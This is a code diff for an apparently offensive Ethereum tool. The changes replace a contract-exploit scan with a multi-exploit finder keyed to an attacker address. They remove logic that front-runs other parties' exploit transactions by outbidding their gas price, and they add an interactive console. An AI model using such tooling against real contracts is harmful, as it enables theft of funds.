@@ -1,8 +1,9 @@
 import argparse
 import psycopg2
+import code
 from theo.server import Server
 from theo.tx_pool import TxPool
-from theo.scanner import exploit
+from theo.scanner import find_exploits
 
 
 def main():
@@ -76,41 +77,22 @@ def main():
 #     print("Shutting down")
 
 
+def wait_for_exploit(exploit):
+    print("Waiting for", exploit)
+
+
 def exec_tx_pool(args):
 
     # Find exploit.
     print("Scanning for exploits")
-    exploit_tx = exploit(args.rpc, args.contract)
-    if exploit_tx == {}:
-        print("No exploit found")
+    exploits = find_exploits(args.rpc, args.contract, args.attacker)
+    if len(exploits) == 0:
+        print("No exploits found")
         return
 
-    print("Found exploit", exploit_tx)
+    print("Found exploit(s)", exploits)
 
-    # Wait for somebody else to exploit the contract and frontrun them.
-    print(
-        "Monitoring tx pool for people trying to exploit {contract}".format(
-            contract=args.contract
-        )
-    )
-    txp = TxPool(args.rpc)
-    pending = txp.wait_for_attack(contract=args.contract, input=exploit_tx["input"])
-
-    for sender in pending:
-        for index in pending[sender]:
-            attack = pending[sender][index]
-            print("Found attack", attack)
-
-            frontrun_tx = {
-                "from": args.attacker,
-                "to": args.contract,
-                "gasPrice": hex(int(attack["gasPrice"], 16) + 1),
-                "input": attack["input"],
-                "gas": attack["gas"],
-                "value": attack["value"],
-            }
-
-            print("Frontrunning with", frontrun_tx)
-            txp.send_tx(frontrun_tx)
+    # Start interface
+    code.interact(local=locals())
 
     print("Shutting down")
